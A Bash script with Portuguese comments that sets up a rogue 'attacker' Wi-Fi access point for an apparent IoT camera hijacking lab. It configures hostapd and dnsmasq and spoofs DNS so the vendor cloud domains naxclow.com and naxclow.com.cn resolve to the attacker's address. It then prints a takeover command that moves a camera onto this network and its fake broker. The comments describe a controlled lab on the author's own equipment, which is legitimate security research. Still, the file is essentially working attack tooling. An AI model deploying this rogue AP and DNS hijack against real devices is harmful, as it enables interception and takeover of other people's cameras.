#!/usr/bin/env bash
#
# ap_atacante.sh — sobe o AP do ATACANTE no dongle (wlan1) para o cenario setwifi
# (video 2: sequestro de rede). NAO toca no wlan0/NetworkManager: o lab de controle
# (mitm_dns) segue vivo no wlan0 e a camera continua falando com o fake/broker ANTES
# de migrar. O fake/broker do mitm_dns dao bind em 0.0.0.0, entao o MESMO broker/fake
# atende a camera na rede do atacante depois do setwifi.
#
# Uso:
#   sudo ./scripts/ap_atacante/ap_atacante.sh up        # sobe o AP (hostapd + dnsmasq)
#   sudo ./scripts/ap_atacante/ap_atacante.sh status    # stations, leases, check DNS
#   sudo ./scripts/ap_atacante/ap_atacante.sh down      # derruba e devolve o wlan1 ao NM
#
# Overrides:
#   IFACE=wlan1 AP_IP=192.168.50.1 SSID=Atacante PASS=atacante12345 CHANNEL=6
#   OUT_DIR=/tmp/ap_atacante
#
# Ambiente controlado / equipamento proprio.
set -uo pipefail

IFACE="${IFACE:-wlan1}"
AP_IP="${AP_IP:-192.168.50.1}"
SUBNET="${AP_IP%.*}"
SSID="${SSID:-Atacante}"
PASS="${PASS:-atacante12345}"
CHANNEL="${CHANNEL:-6}"

OUT_DIR="${OUT_DIR:-/tmp/ap_atacante}"
HOSTAPD_CONF="$OUT_DIR/hostapd.conf"
DNSMASQ_CONF="$OUT_DIR/dnsmasq.conf"
HOSTAPD_LOG="$OUT_DIR/hostapd.log"
DNSMASQ_LOG="$OUT_DIR/dnsmasq.log"
HOSTAPD_PID="$OUT_DIR/hostapd.pid"
DNSMASQ_PID="$OUT_DIR/dnsmasq.pid"

if [[ -t 1 ]]; then
  ok(){ printf '\e[32m[ok]\e[0m %s\n' "$*"; }; warn(){ printf '\e[33m[!!]\e[0m %s\n' "$*"; }
  die(){ printf '\e[31m[x]\e[0m %s\n' "$*" >&2; exit 1; }
else
  ok(){ printf '[ok] %s\n' "$*"; }; warn(){ printf '[!!] %s\n' "$*"; }
  die(){ printf '[x] %s\n' "$*" >&2; exit 1; }
fi
need_root(){ [[ $EUID -eq 0 ]] || die "precisa de root: sudo $0 $*"; }

write_confs() {
  mkdir -p "$OUT_DIR"
  cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
country_code=BR
ieee80211d=1

hw_mode=g
channel=$CHANNEL

# 11n desligado: gatilho comum de erro de firmware em modo AP.
ieee80211n=0
wmm_enabled=0
uapsd_advertisement_enabled=0

auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0

wpa=2
wpa_passphrase=$PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP

beacon_int=100
dtim_period=2
EOF

  cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
except-interface=lo
bind-interfaces
dhcp-range=$SUBNET.10,$SUBNET.100,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
dhcp-leasefile=$OUT_DIR/dnsmasq.leases
address=/naxclow.com/$AP_IP
address=/naxclow.com.cn/$AP_IP
log-queries
log-dhcp
EOF
}

cmd_up() {
  need_root "$@"
  [[ -d "/sys/class/net/$IFACE" ]] || die "$IFACE nao existe — dongle plugado? (IFACE=$IFACE)"
  write_confs

  # solta o dongle do NetworkManager (NAO mexe no wlan0)
  nmcli device set "$IFACE" managed no 2>/dev/null || true

  # limpa sobras desta sessao
  [[ -f "$HOSTAPD_PID" ]] && kill "$(cat "$HOSTAPD_PID")" 2>/dev/null || true
  [[ -f "$DNSMASQ_PID" ]] && kill "$(cat "$DNSMASQ_PID")" 2>/dev/null || true
  pkill -f "hostapd .*$HOSTAPD_CONF" 2>/dev/null || true
  pkill -f "dnsmasq .*$DNSMASQ_CONF" 2>/dev/null || true
  sleep 0.5

  # interface em modo AP
  ip link set "$IFACE" down
  iw dev "$IFACE" set type __ap 2>/dev/null || iw dev "$IFACE" set type ap
  ip addr flush dev "$IFACE"
  ip addr add "$AP_IP/24" dev "$IFACE"
  ip link set "$IFACE" up
  iw dev "$IFACE" set power_save off 2>/dev/null || true

  # hostapd
  setsid hostapd -dd "$HOSTAPD_CONF" >"$HOSTAPD_LOG" 2>&1 &
  echo $! > "$HOSTAPD_PID"
  local i=0
  for ((i=0;i<15;i++)); do grep -qa 'AP-ENABLED' "$HOSTAPD_LOG" && break; sleep 1; done
  grep -qa 'AP-ENABLED' "$HOSTAPD_LOG" && ok "AP-ENABLED ($SSID)" \
    || warn "sem AP-ENABLED (veja $HOSTAPD_LOG)"
  ip addr add "$AP_IP/24" dev "$IFACE" 2>/dev/null || true   # hostapd as vezes zera o IP

  # dnsmasq (DHCP + DNS que aponta o cloud pro atacante)
  setsid dnsmasq -C "$DNSMASQ_CONF" -d >"$DNSMASQ_LOG" 2>&1 &
  echo $! > "$DNSMASQ_PID"
  sleep 1
  local ans; ans=$(dig @"$AP_IP" v720.naxclow.com +short 2>/dev/null | head -1)
  [[ "$ans" == "$AP_IP" ]] && ok "checkpoint DNS: v720.naxclow.com -> $ans" \
    || warn "checkpoint DNS FALHOU: '${ans:-<nada>}' (esperado $AP_IP)"

  ok "AP do atacante no ar: SSID=$SSID  $IFACE=$AP_IP/24  senha=$PASS"
  echo "   Migrar a camera:  sudo TAKEOVER_CMDS='setwifi $SSID $PASS' \\"
  echo "     BROKER=<IP fake> ./scripts/mitm_dns/mitm_dns.sh takeover --no-stream"
}

cmd_down() {
  need_root "$@"
  [[ -f "$HOSTAPD_PID" ]] && kill "$(cat "$HOSTAPD_PID")" 2>/dev/null || true
  [[ -f "$DNSMASQ_PID" ]] && kill "$(cat "$DNSMASQ_PID")" 2>/dev/null || true
  pkill -f "hostapd .*$HOSTAPD_CONF" 2>/dev/null || true
  pkill -f "dnsmasq .*$DNSMASQ_CONF" 2>/dev/null || true
  sleep 0.5
  ip addr flush dev "$IFACE" 2>/dev/null || true
  ip link set "$IFACE" down 2>/dev/null || true
  iw dev "$IFACE" set type managed 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null || true
  nmcli device set "$IFACE" managed yes 2>/dev/null || true
  rm -f "$HOSTAPD_PID" "$DNSMASQ_PID"
  ok "AP do atacante derrubado; $IFACE devolvido ao NetworkManager"
}

cmd_status() {
  echo "AP do atacante — $SSID ($PASS)  iface=$IFACE  ip=$AP_IP"
  echo "----- interface -----"; ip -brief addr show "$IFACE" 2>/dev/null
  iw dev "$IFACE" info 2>/dev/null | grep -E 'type|channel' | sed 's/^/  /'
  echo "----- processos -----"; pgrep -a hostapd || echo "  (hostapd down)"; pgrep -af 'dnsmasq .*ap_atacante' || true
  echo "----- clientes (station dump) -----"
  iw dev "$IFACE" station dump 2>/dev/null | grep -E 'Station|signal:' | sed 's/^/  /' || echo "  (nenhum)"
  echo "----- leases DHCP -----"; cat "$OUT_DIR/dnsmasq.leases" 2>/dev/null || echo "  (sem leases)"
  echo "----- checkpoint DNS -----"; dig @"$AP_IP" v720.naxclow.com +short 2>/dev/null | sed 's/^/  /'
}

case "${1:-}" in
  up)     shift; cmd_up "$@" ;;
  down)   shift; cmd_down "$@" ;;
  status) shift; cmd_status "$@" ;;
  *) echo "uso: $0 up|down|status"; exit 1 ;;
esac
